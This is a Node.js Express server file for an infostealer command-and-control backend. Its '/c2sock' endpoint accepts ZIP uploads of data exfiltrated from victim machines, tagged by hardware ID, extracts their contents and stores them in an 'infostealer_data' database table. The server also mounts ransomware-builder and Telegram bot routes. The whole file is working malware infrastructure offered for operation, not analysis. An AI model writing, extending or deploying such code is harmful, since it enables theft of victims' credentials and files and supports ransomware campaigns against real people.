require('dotenv').config();
const express = require('express');
const multer = require('multer');
const AdmZip = require('adm-zip');
const pool = require('./db');
const winston = require('winston');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const telegramRoutes = require('./routes/telegram');
const authRoutes = require('./routes/auth');
const usersRoutes = require('./routes/users');
const registrationCodesRoutes = require('./routes/registration-codes');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3001;

// Configure logging
const logger = winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
    ),
    transports: [
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.simple()
            )
        }),
        new winston.transports.File({ 
            filename: process.env.LOG_FILE || './logs/arc-server.log' 
        })
    ]
});

// Database connection
// const pool = new Pool({
//     host: process.env.DB_HOST || 'localhost',
//     port: process.env.DB_PORT || 5432,
//     database: process.env.DB_NAME || 'arc_infostealer',
//     user: process.env.DB_USER || 'arc_user',
//     password: process.env.DB_PASSWORD || 'arc_password'
// });

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: (process.env.RATE_LIMIT_WINDOW || 15) * 60 * 1000, // 15 minutes
    max: process.env.RATE_LIMIT_MAX || 100,
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false
});
app.use(limiter);

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({
    storage: storage,
    limits: {
        fileSize: parseInt(process.env.MAX_FILE_SIZE) || 50 * 1024 * 1024 // 50MB default
    },
    fileFilter: (req, file, cb) => {
        // Only accept ZIP files
        if (file.mimetype === 'application/zip' || 
            file.mimetype === 'application/x-zip-compressed' ||
            path.extname(file.originalname).toLowerCase() === '.zip') {
            cb(null, true);
        } else {
            cb(new Error('Only ZIP files are allowed'), false);
        }
    }
});

// Create required directories
const createDirectories = () => {
    const dirs = [
        process.env.UPLOAD_DIR || './uploads',
        process.env.TEMP_DIR || './temp',
        './logs'
    ];
    
    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            logger.info(`Created directory: ${dir}`);
        }
    });
};

// InfoStealer Data Reception Endpoint
app.post('/c2sock', upload.single('file'), async (req, res) => {
    const startTime = Date.now();
    const clientIP = req.ip || req.connection.remoteAddress;
    
    logger.info(`[C2SOCK] InfoStealer exfiltration request received from ${clientIP}`);
    
    try {
        // Extract multipart/form-data fields as specified in ARCHITECTURE.md
        const { hwid, pid, aid } = req.body;
        const zipFile = req.file;
        
        // Validate required fields
        if (!zipFile || !hwid || !pid || !aid) {
            logger.warn(`[C2SOCK] Missing required fields from ${clientIP}:`, { 
                hasFile: !!zipFile, hwid, pid, aid 
            });
            return res.status(400).json({ 
                error: 'Missing required fields: file, hwid, pid, aid' 
            });
        }
        
        logger.info(`[C2SOCK] Processing exfiltration - HWID: ${hwid}, PID: ${pid}, AID: ${aid}`);
        logger.info(`[C2SOCK] ZIP file size: ${zipFile.size} bytes`);
        
        // Extract and process ZIP contents
        const zip = new AdmZip(zipFile.buffer);
        const zipEntries = zip.getEntries();
        
        if (zipEntries.length === 0) {
            logger.warn(`[C2SOCK] Empty ZIP file received from ${clientIP}`);
            return res.status(400).json({ error: 'Empty ZIP file' });
        }
        
        const extractedData = {};
        let totalExtractedSize = 0;
        
        zipEntries.forEach(entry => {
            const entryName = entry.entryName;
            const entryData = entry.getData();
            totalExtractedSize += entryData.length;
            
            logger.debug(`[C2SOCK] Extracting file: ${entryName} (${entryData.length} bytes)`);
            
            // Parse JSON files, store others as text
            if (entryName.endsWith('.json')) {
                try {
                    extractedData[entryName] = JSON.parse(entryData.toString('utf8'));
                } catch (e) {
                    logger.warn(`[C2SOCK] Failed to parse JSON file ${entryName}:`, e.message);
                    extractedData[entryName] = entryData.toString('utf8');
                }
            } else {
                extractedData[entryName] = entryData.toString('utf8');
            }
        });
        
        // Store in database
        const query = `
            INSERT INTO infostealer_data (hwid, pid, aid, client_ip, zip_size, file_count, extracted_size, data, created_at)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW())
            RETURNING id
        `;
        
        const values = [
            hwid,
            parseInt(pid),
            aid,
            clientIP,
            zipFile.size,
            zipEntries.length,
            totalExtractedSize,
            JSON.stringify(extractedData)
        ];
        
        const result = await pool.query(query, values);
        const recordId = result.rows[0].id;
        
        const processingTime = Date.now() - startTime;
        logger.info(`[C2SOCK] Successfully processed exfiltration ${recordId} from ${hwid} in ${processingTime}ms`);
        
        // One-way communication: return minimal response as per ARCHITECTURE.md
        res.status(200).json({ 
            success: true
        });
        
    } catch (error) {
        const processingTime = Date.now() - startTime;
        logger.error(`[C2SOCK] Failed to process exfiltration from ${clientIP} after ${processingTime}ms:`, error);
        
        res.status(500).json({ 
            success: false,
            error: 'Processing failed'
        });
    }
});

// Authentication routes
app.use('/api/auth', authRoutes);

// User management routes
app.use('/api/users', usersRoutes);

// Registration codes routes
app.use('/api/registration-codes', registrationCodesRoutes);

// Telegram bot routes
app.use('/api/telegram', telegramRoutes);

// Ransomware builder routes
const ransomRoutes = require('./routes/ransom');
app.use('/api/ransom', ransomRoutes);

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    if (error instanceof multer.MulterError) {
        if (error.code === 'LIMIT_FILE_SIZE') {
            return res.status(400).json({ error: 'File too large' });
        }
    }
    
    logger.error('Unhandled error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

// WebSocket setup will be implemented here if needed

// Initialize server
const startServer = async () => {
    try {
        // Create required directories
        createDirectories();
        
        // Test database connection
        await pool.query('SELECT NOW()');
        logger.info('Database connection established');
        
        // Start server
        app.listen(PORT, () => {
            logger.info(`Server is running on port ${PORT}`);
            logger.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
            logger.info(`Database connected: ${process.env.DB_NAME}`);
        });
        
    } catch (error) {
        logger.error('Failed to start server:', error);
        process.exit(1);
    }
};

// Graceful shutdown
process.on('SIGTERM', async () => {
    logger.info('SIGTERM received, shutting down gracefully');
    await pool.end();
    process.exit(0);
});

process.on('SIGINT', async () => {
    logger.info('SIGINT received, shutting down gracefully');
    await pool.end();
    process.exit(0);
});

startServer();
